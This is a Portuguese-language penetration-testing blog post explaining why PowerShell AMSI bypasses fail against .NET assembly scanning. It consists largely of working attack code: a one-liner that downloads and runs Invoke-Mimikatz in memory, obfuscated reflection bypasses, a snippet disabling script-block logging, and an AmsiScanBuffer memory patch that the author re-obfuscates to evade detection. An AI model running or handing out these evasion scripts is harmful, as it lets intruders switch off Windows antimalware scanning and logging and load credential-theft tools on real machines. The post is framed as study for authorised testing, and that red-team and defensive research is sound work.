---
title: Bypass de processos específicos de AMSI
author: H41stur
date: 2023-03-06 01:00:00 -0300
categories: [Estudos, AMSI Bypass]
tags: [AMSI, .NET, PowerShell]
image: "/img/posts/amsi.jpg"
alt: "Pentesting Android"
---

![Bypass de processos específicos de AMSI](/img/posts/amsi.jpg)


- [Introdução](#introdução)
- [*Bypass* de AMSI no Powershell](#bypass-de-amsi-no-powershell)
- [Diferença entre *Bypass* do AMSI do PowerShell e Processos Específicos do AMSI](#diferença-entre-bypass-do-amsi-do-powershell-e-processos-específicos-do-amsi)


## Introdução

AMSI (*Antimalware Scan Interface*) é uma interface de programação de aplicativos (API) do Windows que permite que os aplicativos antivírus e outros softwares de segurança possam detectar e impedir a execução de *malwares* e scripts maliciosos em tempo de execução.

A AMSI foi introduzida no Windows 10 e no Windows Server 2016 e, desde então, tem sido amplamente adotada por vários aplicativos antivírus e softwares de segurança. A AMSI fornece uma camada adicional de segurança ao sistema operacional, permitindo que os aplicativos de segurança detectem *malwares* que podem passar despercebidos pelos softwares antivírus tradicionais. Ela pode ser usada para detectar e bloquear scripts maliciosos em várias linguagens de programação, como PowerShell, VBScript e JavaScript, além de outras formas de *malwares* que podem estar escondidos em arquivos ou em comunicações de rede.

Acontece que durante um teste em ambiente Windows, principalmente em *Active Directory* precisamos executar diversos scripts em PowerShell que, por muitas vezes, são considerados maliciosos (com razão) pelo AMSI. Para tanto é preciso uma forma de *bypass* deste mecanismo, a fim de "enganar" este sistema.

Existem vários métodos conhecidos, e funcionais disponíveis na internet, porém, nem todos são eficazes, pois o que é pouco divulgado, é fato de que, em algumas situações, existe mais de uma camada de AMSI para lidar.


## *Bypass* de AMSI no Powershell

Normalmente, para carregar um script PowerShell em memória para evitar detecção de arquivo malicioso por antivírus, utilizamos a função `Invoke-Expression`, em casos normais, como por exemplo, importar o `Invoke-Mimikatz`, utilizamos da seguinte forma:

```powershell
iex(New-object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
```

Porém, o próprio AMSI do PowerShell reconhece este script como malicioso e geralmente nos retorna a seguinte mensagem:

![Detecção do AMSI](/img/posts/2023-03-06_16-19.png)

A mensagem `This script contains malicious content and has been blocked by your antivirus software.` é bem específica e nos mostra de forma clara que o AMSI considera o script como malicioso. Para tanto, existe uma infinidade de scripts públicos para o *bypass* do AMSI do PowerShell, além da possibilidade de tentar qualquer um disponível no [amsi.fail](https://amsi.fail/).

Podemos utilizar um comando comum como o abaixo para tentarmos efetuar o *bypass* como este:

```powershell
[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
```

Este comando por sua vez, efetua o *bypass* do AMSI do PowerShell, nos permitindo importar o script em memória sem problemas, conforme abaixo.

![Bypass do AMSI no PwerShell](/img/posts/2023-03-06_16-39.png)

Porém, se tentarmos executá-lo, seremos apresentados a um novo erro.

![Erro na execução](/img/posts/2023-03-06_16-44.png)

```
Exception calling "Load" with "1" argument(s): "Could not load file or assembly '510976 bytes loaded from
Anonymously Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one
of its dependencies. An attempt was made to load a program with an incorrect format."
```
Diferente da mensagem de erro anterior, esta não nos diz absolutamente nada que a relacione com o AMSI, só informa que o formato dos binários estão incorretos.

Porém `AINDA ESTAMOS LIDANDO COM O AMSI!`

Neste caso, efetuamos o *bypass* do AMSI para o PowerShell em si, porém a `[System.Reflection.Assembly]::Load($byteOutArray)` "triggou" o `AMSI-Scan` para o binário `.NET`.

## Diferença entre *Bypass* do AMSI do PowerShell e Processos Específicos do AMSI

Primeiramente é preciso entender como os processos conhecidos de *bypass* de AMSI funcionam, abaixo estão alguns dos métodos mais utilizados:

```powershell
# forçando um erro:
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)

# Desabilitando o Script Logging:
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")

# Matt Graebers Reflection method:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Basicamente o que estes *snippets* fazem, é desabilitar o PowerShell Script-Logging ou alteram os subvalores do *namespace* `System.Management.Automation`. O `System.Management.Automation` é basicamente o *namespace* raiz do PowerShell.

O que podemos entender, é que todas estas técnicas, são específicas para o PowerShell, e afetam apenas a interface de verificação antimalware para o código de script do próprio Powershell.

Portanto, mesmo alterando os subvalores do *namespace* `System.Management.Automation`, não iremos quebrar o `.NET AMSI-Scan`, pois este não está relacionado com o PowerShell.

Acontece que quando iniciamos uma chamada no PwerShell a `amsi.dll` é carregada em um novo processo para fazer o *hook* de qualquer entrada em linha de comando e analisar o conteúdo das chamadas para `[System.Reflection.Assembly]::Load()`. Portanto, uma das técnicas mais eficazes para o *bypass* do .NET AMSI-Scan, é com `memory patching` do `amsi.dll`. Um artigo completo sobre esta técnica pode ser encontrado [aqui](https://rastamouse.me/memory-patching-amsi-bypass/). Neste caso, a `[System.Reflection.Assembly]::Load()` não cria um novo processo, portanto, efetuar o `memory patching` resultara no *bypass* tanto do *script-code* do PowerShell quanto do .NET AMSI-Scan.

Abaixo o exemplo de *bypass*  sugerido no artigo:

```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

Na maior parte dos casos, este script é funcional, porém como o processo do .NET AMSI-Scan também procura por *strings*, como `amsi.dll`, `AmsiScanBuffer`, `Invoke-Mimikatz` entre várias outras, acredito que o script possa ser melhorado para "encodar" estas *strings*, podendo ficar da seguinte forma:

```powershell
$AQERT = @"
using System;
using System.Runtime.InteropServices;
public class AQERT {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $AQERT

$POCVBOIU = [AQERT]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$IMUNT = [AQERT]::GetProcAddress($POCVBOIU, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[AQERT]::VirtualProtect($IMUNT, [uint32]5, 0x40, [ref]$p)
$FGJT = "0xB8"
$CXWE = "0x57"
$LKAS = "0x00"
$QAWS = "0x07"
$YHNM = "0x80"
$PLMN = "0xC3"
$AZKIU = [Byte[]] ($FGJT,$CXWE,$LKAS,$QAWS,+$YHNM,+$PLMN)
[System.Runtime.InteropServices.Marshal]::Copy($AZKIU, 0, $IMUNT, 6)
```

Ao executermos este script, faremos um *bypass* "global" do AMSI, permitindo a execução do script sem erros.

![Bypass global do AMSI](/img/posts/2023-03-06_17-27.png)


## Referências

- [amsi.fail](https://amsi.fail)
- [AmsiScanBufferBypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [Bypass AMSI by manual modification](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)